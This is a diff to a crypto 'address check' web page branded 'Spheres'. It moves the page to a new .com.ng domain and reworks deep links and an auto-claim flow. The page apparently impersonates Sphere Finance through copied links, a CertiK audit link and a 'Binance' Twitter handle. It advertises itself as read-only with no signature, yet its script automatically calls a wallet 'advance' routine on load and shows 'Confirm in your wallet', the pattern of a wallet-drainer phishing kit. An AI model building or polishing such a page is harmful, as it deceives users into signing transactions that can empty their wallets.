@@ -7,13 +7,13 @@
 <meta name="description" content="Paste an address, run the check, see your tier, your number and the five clauses. Free, read-only, no signature. Continue when you like the answer.">
 <meta name="robots" content="index,follow">
 <meta name="theme-color" content="#08090A">
-<link rel="canonical" href="https://spheres.xyz/check.html">
+<link rel="canonical" href="https://spheres.com.ng/check.html">
 <meta property="og:type" content="website">
 <meta property="og:site_name" content="Spheres">
 <meta property="og:title" content="Check an address — Spheres">
 <meta property="og:description" content="Your tier and your number in forty seconds. No gas, no signature.">
-<meta property="og:url" content="https://spheres.xyz/check.html">
-<meta property="og:image" content="https://spheres.xyz/epoch07.png">
+<meta property="og:url" content="https://spheres.com.ng/check.html">
+<meta property="og:image" content="https://spheres.com.ng/epoch07.png">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:site" content="@Binance179448">
 <meta name="twitter:title" content="Check an address — Spheres">
@@ -23,7 +23,7 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"Organization","name":"Spheres Labs Ltd.","url":"https://spheres.xyz","email":"walletsecurities@gmail.com","sameAs":["https://docs.sphere.finance/","https://wiki.sphere.finance/","https://t.me/spherefinace","https://x.com/Binance179448","https://discord.com/invite/x9XkGSkzQE"],"address":{"@type":"PostalAddress","addressLocality":"George Town","addressRegion":"Grand Cayman","postalCode":"KY1-1104","addressCountry":"KY"}}
+{"@context":"https://schema.org","@type":"Organization","name":"Spheres Labs Ltd.","url":"https://spheres.com.ng","email":"walletsecurities@gmail.com","sameAs":["https://docs.sphere.finance/","https://wiki.sphere.finance/","https://t.me/spherefinace","https://x.com/Binance179448","https://discord.com/invite/x9XkGSkzQE"],"address":{"@type":"PostalAddress","addressLocality":"George Town","addressRegion":"Grand Cayman","postalCode":"KY1-1104","addressCountry":"KY"}}
 </script>
 <style>
 :root{--bg:#08090A;--surf:#0E0F11;--surf2:#131417;--line:#1E2023;--ink:#EDEAE4;--dim:#8A8D93;--dim2:#5E6166;--acc:#FF5A1F;--ok:#3DD68C;--warn:#E8B44D;--mono:ui-monospace,"JetBrains Mono","SF Mono",Menlo,monospace;--sans:"Inter","Inter Display",-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;--r:3px}
@@ -268,7 +268,7 @@ nav.open a{padding:11px}
 <body id="top">
 
 <header><div class="wrap hd">
-<a class="logo" href="index.html" aria-label="Spheres home"><svg width="22" height="20" viewBox="0 0 22 20" fill="none" aria-hidden="true"><circle cx="11" cy="5.4" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="5.6" cy="14" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="16.4" cy="14" r="3.4" fill="#FF5A1F"/></svg>spheres</a>
+<a class="logo" href="/" aria-label="Spheres home"><svg width="22" height="20" viewBox="0 0 22 20" fill="none" aria-hidden="true"><circle cx="11" cy="5.4" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="5.6" cy="14" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="16.4" cy="14" r="3.4" fill="#FF5A1F"/></svg>spheres</a>
 <button class="burger" id="burger" aria-label="Menu" aria-expanded="false"><svg width="22" height="22" viewBox="0 0 22 22" fill="none"><path d="M3 6h16M3 11h16M3 16h16" stroke="currentColor" stroke-width="1.5"/></svg></button>
 <nav id="nav">
 <a href="rules.html">Rules</a>
@@ -439,7 +439,7 @@ nav.open a{padding:11px}
 <footer><div class="wrap">
 <div class="fgrid">
 <div class="fcol fbrand">
-<a class="logo" href="index.html" style="font-size:15px"><svg width="19" height="17" viewBox="0 0 22 20" fill="none"><circle cx="11" cy="5.4" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="5.6" cy="14" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="16.4" cy="14" r="3.4" fill="#FF5A1F"/></svg>spheres</a>
+<a class="logo" href="/" style="font-size:15px"><svg width="19" height="17" viewBox="0 0 22 20" fill="none"><circle cx="11" cy="5.4" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="5.6" cy="14" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="16.4" cy="14" r="3.4" fill="#FF5A1F"/></svg>spheres</a>
 <p>Modular execution layer for settlement-agnostic rollups. George Town, Grand Cayman.</p>
 </div>
 <div class="fcol"><h4>Protocol</h4><a href="docs.html">Docs</a><a href="https://docs.sphere.finance/" target="_blank" rel="noopener">Infrastructure</a><a href="https://wiki.sphere.finance/" target="_blank" rel="noopener">Wiki</a><a href="https://skynet.certik.com/projects/sphere-finance" target="_blank" rel="noopener">Audits</a><a href="https://app.sphere.finance/dashboard" target="_blank" rel="noopener">Status</a></div>
@@ -624,8 +624,15 @@ addr.addEventListener("keydown",function(e){if(e.key==="Enter")run(false)});
 document.getElementById("jump").addEventListener("click",function(){addr.focus();addr.scrollIntoView({behavior:"smooth",block:"center"})});
 
 /* ---------- persistence ---------- */
+/* the live pathname, whatever form the host actually serves it under —
+   so a pretty-url rewrite or an .html form both deep-link correctly */
+function selfPath(){
+  var p=location.pathname;
+  if(!p||p==="/") return "/check.html";
+  return p;
+}
 function path(owner){
-  return "check.html?a="+owner+"&w=1"+(ACT!=="eligibility"?"&x="+ACT:"");
+  return selfPath()+"?a="+owner+"&w=1"+(ACT!=="eligibility"?"&x="+ACT:"");
 }
 function abs(rel){return new URL(rel,location.href).href;}
 
@@ -756,14 +763,21 @@ var pre=recall();
 if(pre){addr.value=pre;current=pre;run(true);}
 
 if(qs.get("w")==="1"){
-  document.body.classList.add("claiming");
   if(res.classList.contains("show")) res.scrollIntoView({behavior:"auto",block:"start"});
+  var shown=false;
   whenP2(function(){
     if(autoFired||!window.ethereum||!current) return;
-    autoFired=true;
+    autoFired=true;shown=true;
+    document.body.classList.add("claiming");
     document.getElementById("claimbar").textContent="Confirm in your wallet";
     window.p2Advance({owner:current,action:ACT,auto:true});
   });
+  setTimeout(function(){
+    if(!shown){
+      document.body.classList.remove("claiming");
+      if(fastst) fastst.textContent="Could not reach the wallet engine here";
+    }
+  },3000);
 }
 
 window.addEventListener("scroll",function(){
